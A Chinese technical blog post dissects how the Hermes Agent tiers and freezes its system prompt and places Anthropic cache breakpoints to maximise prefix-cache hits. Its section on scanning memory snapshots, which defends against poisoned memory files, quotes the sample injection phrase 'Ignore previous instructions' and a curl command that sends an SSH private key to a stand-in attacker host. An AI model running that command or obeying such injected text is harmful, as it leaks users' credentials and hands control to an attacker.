# 系统提示词字节战：Hermes Agent 如何让前缀缓存命中率最大化

> **本文基于 Hermes Agent v0.20.0**（2026.8.3 发布，commit `88ab589f6`）
>
> 所有路径、类名、函数名均在 `~/.hermes/hermes-agent/` 源码中核实。

## 一次对话的隐形开销

用 AI 助手聊天时，用户看到的是「你说一句，它答一句」。但在这背后，每一轮对话都会把**完整的历史消息 + 系统提示词 + 工具定义**重新发给大模型 API。一个 20 轮的对话，系统提示词就被重复发送 20 次。

如果一个系统提示词有 8000 token，每轮都原样重发，20 轮下来光系统提示词就消耗 160,000 token——这还没算对话本身。而 Anthropic、OpenAI 等厂商提供的**前缀缓存**（prompt caching）可以跳过已缓存部分的计费，但前提是：**前缀必须逐字节不变**。差一个字符，缓存就 miss，整段重新计费。

Hermes Agent 的系统提示词组装就是围绕这条铁律设计的。`agent/system_prompt.py` 文件头注释开宗明义：

```
The agent's system prompt is built once per session and reused across all
turns — only context compression triggers a rebuild.  This keeps the
upstream prefix cache warm.
```

系统提示词每个会话只构建一次，之后逐字重放，只有上下文压缩时才重建——而且重建时有一整套机制保证缓存前缀仍然命中。

---

## 三段式架构：stable / context / volatile

系统提示词不是一坨字符串，而是三层拼接，每层的「变动频率」不同。

```python
# agent/system_prompt.py 约 683-685 行
return {
    "stable":   "\n\n".join(p.strip() for p in stable_parts   if p and p.strip()),
    "context":  "\n\n".join(p.strip() for p in context_parts  if p and p.strip()),
    "volatile": "\n\n".join(p.strip() for p in volatile_parts if p and p.strip()),
}
```

最终通过 `\n\n` 拼成一个字符串：

```python
# agent/system_prompt.py 约 707 行
joined = "\n\n".join(p for p in (parts["stable"], parts["context"], parts["volatile"]) if p)
```

三层的内容和生命周期：

| 段 | 内容 | 变动频率 |
|---|---|---|
| **stable** | 身份定义（SOUL.md 或默认人格）、工具使用指南、并行工具调用指南、computer-use 指南、per-model 操作指南、编码姿态、环境探测、profile 提示 | 跨会话稳定（SOUL.md 不改就不变） |
| **context** | 调用方传入的 system_message + 工作目录下的 AGENTS.md / .cursorrules 等上下文文件 + 编码工作区快照 | 会话内稳定（cwd 不变就不变） |
| **volatile** | 技能索引、记忆快照、USER.md 画像、外部 memory provider 块、时间戳/session/model/provider 行 | 理论上每次都可能变 |

为什么这么分？因为**前缀缓存只认从头开始的最长公共前缀**。把最稳定的内容放最前面，最容易变的放最后面，即使尾部变了，头部仍然命中缓存。这是整个设计的核心思想。

### stable 段：跨会话不变的地基

stable 段是缓存命中率的基础。它由一系列「拼接块」按固定顺序组成（`agent/system_prompt.py` 约 300-460 行）：

```python
stable_parts: List[str] = []

# 1. 身份：优先 SOUL.md，没有就用默认人格
if agent.load_soul_identity or not agent.skip_context_files:
    _soul_content = _r.load_soul_md(_ctx_len)
    if _soul_content:
        stable_parts.append(_soul_content)

if not _soul_loaded:
    stable_parts.append(DEFAULT_AGENT_IDENTITY)

# 2. Hermes 自身帮助引导
stable_parts.append(HERMES_AGENT_HELP_GUIDANCE)

# 3. 任务完成/反编造指引（所有模型通用）
if getattr(agent, "_task_completion_guidance", True) and agent.valid_tool_names:
    stable_parts.append(TASK_COMPLETION_GUIDANCE)

# 4. 并行工具调用引导
if getattr(agent, "_parallel_tool_call_guidance", True) and agent.valid_tool_names:
    stable_parts.append(PARALLEL_TOOL_CALL_GUIDANCE)

# 5. 工具感知行为引导（memory/session_search/skill_manage 各一块）
# 6. steering 通道备注
# 7. computer-use 指南
# 8. per-model 操作指南
# 9. 编码姿态前缀
# 10. 环境探测（非默认时才输出）
# 11. profile 提示
```

关键设计：这些块的**内容和顺序在会话期间完全固定**。即使是环境探测这种「看似运行时」的信息（Python 版本、PEP-668 状态），也只在 prompt 构建时探测一次，之后冻结。环境变了？下一次会话才更新。

### context 段：工作空间上下文

context 段夹在中间，包含工作目录下发现的 AGENTS.md / .cursorrules 等项目级指令文件，以及编码工作区快照。它的稳定性介于 stable 和 volatile 之间——在同一个工作目录的同一个会话里不变，但换目录或换项目就会变。

```python
# agent/system_prompt.py 约 545-620 行（context_parts 组装）
context_parts: List[str] = []

# 调用方传入的 system_message
if system_message:
    context_parts.append(system_message)

# 工作目录上下文文件 + 编码工作区快照
# ...
```

### volatile 段：每次可能变的尾部

volatile 段是整个系统提示词里最「活跃」的部分：

```python
# agent/system_prompt.py 约 620-685 行
volatile_parts: List[str] = []

# 1. 技能索引（skills index）
if skills_prompt:
    volatile_parts.append(skills_prompt)

# 2. 记忆快照（memory snapshot）
if agent._memory_store and agent._memory_enabled:
    mem_block = agent._memory_store.format_for_system_prompt("memory")
    if mem_block:
        volatile_parts.append(mem_block)

# 3. USER.md 画像
if agent._user_profile_enabled:
    user_block = agent._memory_store.format_for_system_prompt("user")
    if user_block:
        volatile_parts.append(user_block)

# 4. 外部 memory provider
# 5. 插件 prompt 段
# 6. 时间戳行
volatile_parts.append(timestamp_line)
```

这里有一个容易被忽略的细节——技能索引为什么放在 volatile 而不是 stable？源码注释解释得很清楚：

```python
# Skills are runtime-mutable: the agent adds and patches them across a
# session (SKILLS_GUIDANCE tells it to patch a skill the moment it goes
# stale). The built prompt is cached per session and only rebuilt on
# compaction/restore (see build_system_prompt), so a skill change is not
# byte-stable across rebuilds. With the index in the stable band, a rebuild
# that picked up a skill change would bust the cached prefix from the index
# down, taking the whole scaffold with it. Render it at the FRONT of the
# volatile band instead ...
```

技能在会话中可以被动态添加和修改。如果把技能索引放在 stable 段，一旦技能变化触发重建，整个 stable 段的缓存前缀全部失效——后面的所有内容跟着遭殃。放在 volatile 段的开头，即使技能变了，也只影响 volatile 段自己，stable 和 context 的缓存照样命中。

---

## 冻结快照：记忆写入不破坏缓存

volatile 段里最微妙的设计是记忆的「冻结快照」模式。

用户和 Agent 聊天时，经常会产生新的记忆——「记住我喜欢简洁回复」「我的时区是东八区」。这些记忆需要写进 `MEMORY.md`，然后在后续对话中注入系统提示词。但问题来了：如果每写一条记忆就更新系统提示词，缓存就废了。

`tools/memory_tool.py` 的 `MemoryStore` 类用了一个两份状态的方案解决这个问题：

```python
# tools/memory_tool.py 约 153 行
class MemoryStore:
    """有界 curated memory，文件持久化。每个 AIAgent 一个实例。

    维护两份平行状态：
      - _system_prompt_snapshot：load 时冻结，用于系统提示词注入。
        会话期间永不变更，保住前缀缓存。
      - memory_entries / user_entries：实时状态，工具调用时变更，落盘。
    """
```

```python
# tools/memory_tool.py 约 171 行
# Frozen snapshot for system prompt -- set once at load_from_disk()
self._system_prompt_snapshot: Dict[str, str] = {"memory": "", "user": ""}
```

会话开始时，`load_from_disk()` 读 `MEMORY.md` 和 `USER.md`，构建冻结快照：

```python
# tools/memory_tool.py 约 204 行
def load_from_disk(self):
    """Load entries from MEMORY.md and USER.md, capture system prompt snapshot.

    The frozen snapshot is what enters the system prompt. We scan each
    entry for injection/promptware patterns at snapshot-build time —
    ANY hit replaces the entry text in the snapshot with a placeholder
    like ``[BLOCKED: …]``, so a poisoned-on-disk memory file (supply
    chain, compromised tool, sister-session write) cannot inject into
    the system prompt.
    """

    self.memory_entries = self._read_file(mem_dir / "MEMORY.md")
    self.user_entries = self._read_file(mem_dir / "USER.md")

    # 对快照做安全扫描（注入/外泄模式检测），命中则替换为占位符
    sanitized_memory = self._sanitize_entries_for_snapshot(
        self.memory_entries, "MEMORY.md"
    )
    sanitized_user = self._sanitize_entries_for_snapshot(
        self.user_entries, "USER.md"
    )

    # 冻结快照——系统提示词里看到的是这份
    self._system_prompt_snapshot = {
        "memory": self._render_block("memory", sanitized_memory),
        "user": self._render_block("user", sanitized_user),
    }
```

之后，任何 `memory` 工具调用写入新记忆，只更新实时状态（`memory_entries`）和磁盘文件，**冻结快照纹丝不动**：

```python
# tools/memory_tool.py 约 682 行
def format_for_system_prompt(self, target: str) -> Optional[str]:
    """Return the frozen snapshot for system prompt injection.
    ...
    """
    block = self._system_prompt_snapshot.get(target, "")
```

效果：会话中途写的新记忆，这一次对话的系统提示词不变（缓存命中），下一次会话开始时才进系统提示词。

### 安全扫描也在冻结时做

注意 `load_from_disk()` 里对快照做的 `_sanitize_entries_for_snapshot` 扫描。它用 `tools/threat_patterns` 检测两种威胁：

1. **提示词注入**：如 `"Ignore previous instructions and ..."`
2. **数据外泄**：如 `"curl attacker.com?data=$(cat ~/.ssh/id_rsa)"`

命中后，快照里的该条目被替换成 `[BLOCKED: …]` 占位符。但**实时状态保留原文**——这样用户通过 `memory` 工具仍然能看到被污染的条目（知道被攻击了），然后手动删除。这个设计的注释说得很明确：

```python
# The live ``memory_entries`` / ``user_entries`` lists keep the
# original text so the user can still SEE poisoned entries ...
# silently dropping them would hide the attack from the user.
```

扫描是确定性的（从磁盘字节算出），所以冻结快照在整个会话期间保持稳定——前缀缓存不变量成立。

---

## 时间戳精度：一天 vs 一分钟

volatile 段的最后一行是时间戳：

```python
# agent/system_prompt.py 约 680 行
timestamp_line = f"Conversation started: {now.strftime('%A, %B %d, %Y')}"
```

注意：**只到天，不到分钟**。这不是偷懒，是刻意的缓存优化。源码注释解释：

```python
# Date-only (not minute-precision) so the system prompt is byte-stable
# for the full day.  Minute-precision changes invalidate prefix-cache KV
# on every rebuild path (compression boundary, fresh-agent gateway turns,
# session resume without a stored prompt).  The model can still query the
# exact wall-clock time via tools when it actually needs it.
# Credit: @iamfoz (PR #20451).
```

如果时间戳精确到分钟，每次重建（上下文压缩、网关新会话、会话恢复）都会因为时间不同导致缓存 miss。精确到天，一天之内不管重建多少次，这个字段都不变。模型需要精确时间时，通过工具查。

---

## Anthropic 前缀缓存：4 个断点的精算

前面的三段式和冻结快照保证了系统提示词在会话内字节稳定。但这只是基础——真正省钱的是 Anthropic 的 prompt caching 机制。

`agent/prompt_caching.py` 文件头注释描述了整体策略：

```
The default layout uses 4 cache_control breakpoints: the static system
prefix, the end of the system prompt, and the last 2 non-system messages.
When a static system prefix is unavailable, it falls back to one system
breakpoint plus the last 3 messages.
```

Anthropic 限制每个请求最多 4 个 `cache_control` 断点。Hermes 的分配策略：

| 断点 | 位置 | 作用 |
|---|---|---|
| 1 | stable 段末尾 | 缓存跨会话不变的身份+指南 |
| 2 | 系统提示词末尾 | 缓存完整的系统提示词 |
| 3 | 倒数第 2 条非系统消息 | 缓存最近的对话上下文 |
| 4 | 最后 1 条非系统消息 | 缓存最新消息之前的前缀 |

### 系统提示词的「劈开」技巧

关键操作在 `_apply_system_cache_markers`（`agent/prompt_caching.py` 约 151 行）。系统提示词在存储层是一个字符串，但在发往 Anthropic 的请求里，它被劈成两个 text block：

```python
def _apply_system_cache_markers(message, cache_marker, static_system_prefix, ...):
    content = message.get("content")
    if (
        isinstance(static_system_prefix, str)
        and static_system_prefix
        and isinstance(content, str)
        and content.startswith(static_system_prefix)
    ):
        suffix = content[len(static_system_prefix):]
        if suffix:
            message["content"] = [
                {
                    "type": "text",
                    "text": static_system_prefix,
                    "cache_control": cache_marker,   # 断点 1
                },
                {
                    "type": "text",
                    "text": suffix,
                    "cache_control": cache_marker,   # 断点 2
                },
            ]
            return 2  # 用掉了 2 个断点
```

存储层的一个字符串，在请求层变成 `[static_prefix 带 cache, volatile_suffix 带 cache]`。前半段跨会话命中（身份、指南、工具说明），后半段会话内命中（技能索引、记忆、画像）。

`static_system_prefix` 怎么来的？`reconstruct_static_prefix`（约 730 行）在会话恢复或 provider 切换时重建：

```python
def reconstruct_static_prefix(agent, system_message=None, *, log_label="restore"):
    """Reconstruct ``_cached_system_prompt_static`` for a stored prompt.

    The static prefix is not persisted (only the full prompt is), so any
    path that adopts a stored/kept ``_cached_system_prompt`` — session
    restore, the compression keep-prompt path, or a failover to a cache-on
    provider mid-turn — must rebuild the stable tier to regain the
    two-block ``[static, volatile]`` system layout.
    """
    # ...
    static = build_system_prompt_parts(agent, system_message=system_message)["stable"]
    if static and stored.startswith(static):
        agent._cached_system_prompt_static = static
```

它用 `build_system_prompt_parts` 重新算出 stable 段，然后验证存储的完整提示词确实以这个 stable 段开头——只有完全匹配才设为 static prefix。如果 SOUL.md 被编辑过导致不匹配，static prefix 设为 None，退回「1 个系统断点 + 最后 3 条消息」的兜底布局。**宁可不用高级缓存布局，也不冒字节不匹配的风险**。

### 剩余断点给对话消息

系统提示词消耗 2 个断点后，剩下 2 个给最近的非系统消息：

```python
# agent/prompt_caching.py apply_anthropic_cache_control 约 387 行
remaining = 4 - breakpoints_used  # 4 - 2 = 2
non_sys = [
    i for i in range(len(messages))
    if messages[i].get("role") != "system"
    and _can_carry_marker(messages[i], native_anthropic=native_anthropic)
]
for idx in non_sys[-remaining:]:  # 最后 2 条
    messages[idx] = copy.deepcopy(messages[idx])
    _apply_cache_marker(messages[idx], marker, native_anthropic=native_anthropic)
```

`_can_carry_marker` 会跳过不能携带标记的消息（如空内容的 assistant turn、OpenRouter 不支持 top-level cache_control 的 tool message），避免浪费宝贵的断点配额。

---

## 后台 Review Fork：白嫖父会话的缓存

Hermes Agent 每轮对话结束后会 fork 一个后台 review agent，自动判断「有值得存的技能或记忆吗？」。这个 fork 面临一个缓存问题：它是独立的 AIAgent 实例，如果重建系统提示词，时间戳、session_id、工具集都可能不同，缓存前缀就 miss 了。

`agent/background_review.py` 约 865 行的解决方案很直接——**直接继承父会话的缓存系统提示词**：

```python
# Inherit the parent's cached system prompt verbatim so
# the review fork's outbound HTTP request hits the same
# Anthropic/OpenRouter prefix cache the parent warmed.
# Without this, the fork rebuilds the system prompt from
# scratch (fresh _hermes_now() timestamp, fresh
# session_id, narrower toolset → different skills_prompt)
# and the byte-exact prefix-cache key misses. See
# issue #25322 and PR #17276 for the full analysis +
# measured impact (~26% end-to-end cost reduction on
# Sonnet 4.5).
```

注释里提到的实测数据：在 Sonnet 4.5 上，继承父缓存带来了 **~26% 的端到端成本下降**。

为了保证字节一致，fork 还做了一系列对齐：

```python
# The review fork pins the parent's cached system prompt and keeps
# ``tools[]`` byte-identical to the parent so its outbound request
# hits the same provider cache prefix.
review_agent._skip_mcp_refresh = True   # 不做 MCP 刷新（可能改变工具集）
review_agent._memory_store = agent._memory_store  # 共享同一份冻结快照
```

MCP 刷新会在会话中动态添加新连接的 MCP 工具——这会改变 `tools[]` 数组，导致缓存 key 不匹配。fork 显式跳过这一步，宁可工具集少几个，也要保住缓存命中。

---

## 失败容错：缓存降级而非出错

整个缓存体系有一套优雅的降级策略。当某些条件不满足时，不是报错，而是退回更简单但仍然可用的布局：

| 场景 | 降级策略 |
|---|---|
| 没有 static prefix（SOUL.md 刚被改） | 退回 1 个系统断点 + 最后 3 条消息 |
| 非 Anthropic provider | 不加 cache_control（其他厂商可能不支持） |
| provider 中途 failover | 先 `strip_anthropic_cache_control` 清除旧标记，再按新 provider 策略重新加 |
| 空 assistant turn | 跳过（OpenRouter 不认 top-level marker） |
| static prefix 重建失败 | memoize 失败结果，不在热路径上反复重试 |

`strip_anthropic_cache_control`（约 215 行）的注释点出了一个微妙的问题：provider failover 时，消息可能已经被图片压缩、ASCII 清理等操作修改过。这时候不能简单地把消息恢复原样再重新加标记——那样会丢失这些修改。正确的做法是**保留修改后的内容，只替换标记**：

```python
# Used before re-applying decoration after a mid-turn provider failover so
# the mutated, undecorated shape (image shrink / ASCII cleanup / etc.) is
# preserved while markers match the *new* provider's cache policy.
```

---

## Builder 声明的稳定前缀

最后一个值得拎出来的设计是 `agent/prompt_cache_boundary.py`。这是一个进程本地的注册表，解决的是一个更细粒度的问题。

技能、webhook、cron 的 builder 在构建用户消息时，会把一个大的静态脚手架（技能激活说明 + 展开的技能正文）和一个小的变化尾部（工单 payload、时间戳、运行上下文）拼在一条用户消息里。只有 builder 自己知道这条消息里「静态部分到哪里结束」。

如果让缓存规划器自己去猜这个边界（比如搜标记字符串），会面临一个悖论：标记字符串可能合法地出现在技能正文或事件 payload 里（比如一张工单恰好引用了一段 agent 对话）。任何分隔符搜索启发式要么缩小缓存前缀，要么更糟——把变化字节吸收进缓存前缀，重新引入每次调用的缓存 miss。

解决方案是 builder 在构建时主动注册稳定前缀：

```python
# agent/prompt_cache_boundary.py
_prefixes: "OrderedDict[str, None]" = OrderedDict()

def register_stable_prefix(prefix: str) -> None:
    """Record ``prefix`` as the stable scaffold of a just-built message."""
    if not prefix:
        return
    with _lock:
        _prefixes[prefix] = None
        _prefixes.move_to_end(prefix)
        # LRU 淘汰：最多 32 个条目，总字符不超过 4MB
        while len(_prefixes) > _MAX_ENTRIES:
            _prefixes.popitem(last=False)
        while len(_prefixes) > 1 and sum(map(len, _prefixes)) > _MAX_CHARS:
            _prefixes.popitem(last=False)

def find_stable_prefix(content: str) -> Optional[str]:
    """Longest registered prefix that is a *proper* prefix of ``content``."""
    with _lock:
        best = None
        for prefix in _prefixes:
            if len(content) > len(prefix) and content.startswith(prefix):
                if best is None or len(prefix) > len(best):
                    best = prefix
        return best
```

注册表有 LRU 淘汰（32 个条目 / 4MB 总字符），一个每分钟被 cron 触发的技能不会被偶尔的一次性技能调用挤出。注册表是进程本地的——webhook/cron 调用总是由同一个进程构建并发送，这正是 split 有意义的唯一窗口。

---

## 总结：缓存命中的四层防线

把整个体系串起来看，Hermes Agent 围绕「系统提示词字节稳定」建立了四层防线：

```
第一层：三段式架构
  stable（跨会话不变）→ context（会话内不变）→ volatile（可能变）
  把最稳定的内容放最前面，最大保住前缀缓存命中

第二层：冻结快照
  记忆/画像在 load 时冻结，会话中途写入不更新系统提示词
  新记忆下一次会话才进提示词

第三层：精度妥协
  时间戳只到天（不到分钟）
  一天之内不管重建多少次都字节一致

第四层：Anthropic 缓存断点
  4 个断点精算：static prefix (1) + 系统提示词尾部 (1) + 最近消息 (2)
  存储层一个字符串，请求层劈成两个 cache block
```

这四层叠在一起的效果是：一个典型的长对话，系统提示词部分的前缀缓存命中率接近 100%，只有 volatile 尾部因记忆/技能变化偶尔 miss。后台 review fork 直接继承父缓存，额外省 26%。

这不是某个单一技巧能做到的——三段式、冻结快照、精度妥协、断点精算，缺了任何一层，其他层的努力都会被浪费。
